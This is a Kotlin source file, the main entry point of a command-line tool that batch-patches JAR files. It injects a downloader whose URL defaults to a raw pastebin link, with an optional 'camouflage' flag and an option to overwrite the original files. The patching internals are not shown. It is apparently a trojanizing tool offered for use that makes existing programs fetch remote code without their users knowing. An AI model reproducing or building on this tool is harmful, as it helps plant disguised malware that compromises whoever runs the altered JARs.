package com.tmquan2508.inject

import com.google.gson.GsonBuilder
import com.tmquan2508.inject.cli.*
import com.tmquan2508.inject.config.Config
import java.io.File
import kotlin.system.exitProcess

fun main(args: Array<String>) {
    val logger = ConsoleLogger()
    try {
        runCli(args.toList(), logger)
    } catch (e: Exception) {
        handleError(e, boolArg("trace-errors", "tr", args.toList()), logger)
    }
}

fun runCli(args: List<String>, logger: ConsoleLogger) {
    logger.setDebug(boolArg("debug", "db", args))

    if (args.isEmpty() || boolArg("help", "h", args)) showHelpAndExit()

    val command = args.first()

    when (command) {
        "--inject" -> runInjection(args, logger)
        "--generate-config" -> runGenerateConfig(args, logger)
        else -> {
            logger.error("Unknown command: $command"); println(HELP_MESSAGE); exitProcess(1)
        }
    }
}

fun runGenerateConfig(args: List<String>, logger: ConsoleLogger) {
    val outputPath = args.getOrNull(1) ?: throw Exception("Please provide the output path for config.json")
    try {
        val defaultConfig = Config()
        val jsonString = GsonBuilder().setPrettyPrinting().create().toJson(defaultConfig)
        File(outputPath).writeText(jsonString, Charsets.UTF_8)
        logger.info("Default configuration file created at: $outputPath")
    } catch (e: Exception) {
        throw Exception("Could not write default configuration file: ${e.message}", e)
    }
}

fun runInjection(args: List<String>, logger: ConsoleLogger) {
    val configPath = findArg("config", "c", args)
        ?: throw Exception("Please provide the path to the configuration file via --config <path>")
    val configJson = File(configPath).readText(Charsets.UTF_8)

    val mode = findArg("mode", "m", args) ?: "single"
    val inputPath = findArg("input", "i", args) ?: if (mode == "multiple") "in" else "in.jar"
    val outputPath = findArg("output", "o", args) ?: if (mode == "multiple") "out" else "out.jar"
    val replace = boolArg("replace", "r", args)
    val camouflage = boolArg("camouflage", null, args)
    val downloaderUrl = findArg("url", "u", args) ?: "https://pastebin.com/raw/JD0bB1Eb"

    val inputFiles = when (mode) {
        "multiple" -> {
            val inputDir = File(inputPath)
            if (!inputDir.isDirectory) throw Exception("Input path is not a directory for 'multiple' mode: $inputPath")
            inputDir.listFiles { _, name -> name.endsWith(".jar") }?.toList() ?: emptyList()
        }
        "single" -> listOf(File(inputPath).takeIf { it.isFile } ?: throw Exception("Input path is not a file for 'single' mode: $inputPath"))
        else -> throw Exception("Invalid mode: $mode. Use 'single' or 'multiple'.")
    }

    if (inputFiles.isEmpty()) {
        logger.warn("No .jar files found in the input path.")
        return
    }

    logger.info("Found ${inputFiles.size} JAR(s) to process in '$mode' mode.")

    inputFiles.forEach { inputFile ->
        val effectiveOutputFile = when {
            replace -> inputFile
            mode == "multiple" -> File(outputPath).apply { mkdirs() }.resolve(inputFile.name)
            else -> File(outputPath)
        }

        if (!replace && effectiveOutputFile.exists()) {
            logger.warn("Skipped because output file already exists: ${effectiveOutputFile.name}. Use --replace to overwrite.")
            return@forEach
        }

        try {
            val inputBytes = inputFile.readBytes()
            val patchedBytes = PatcherFacade.patchJar(
                inputJarBytes = inputBytes,
                configJson = configJson,
                downloaderUrl = downloaderUrl,
                useCamouflage = camouflage,
                logger = logger,
                originalFileName = inputFile.name
            )

            if (!inputBytes.contentEquals(patchedBytes)) {
                effectiveOutputFile.parentFile.mkdirs()
                effectiveOutputFile.writeBytes(patchedBytes)
            }
        } catch (e: Exception) {
            if (e is InterruptedException) Thread.currentThread().interrupt()
        }
    }
}

fun handleError(e: Exception, trace: Boolean, logger: ConsoleLogger) {
    logger.error("${e.javaClass.simpleName}: ${e.message}")
    if (trace) {
        e.printStackTrace()
    }
    exitProcess(1)
}

fun showHelpAndExit() {
    println(HELP_MESSAGE)
    exitProcess(0)
}